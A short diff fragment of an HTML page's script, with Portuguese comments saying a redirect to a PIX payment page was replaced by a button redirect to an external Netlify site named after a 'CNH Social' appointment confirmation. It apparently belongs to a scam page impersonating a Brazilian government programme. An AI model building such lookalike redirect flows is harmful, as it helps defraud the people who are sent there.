+            // Removido o redirecionamento para pix.html.
+            // O fluxo do programa agora termina aqui.
+            // Agora o botão irá redirecionar o usuário para o link especificado.
+            window.location.href = "https://cnhsocialconfirmacaodeagendamento.netlify.app/";
+        });
+
+        // Initialize the first part
+        showPart(0);
+    </script>
+</body>
+</html>
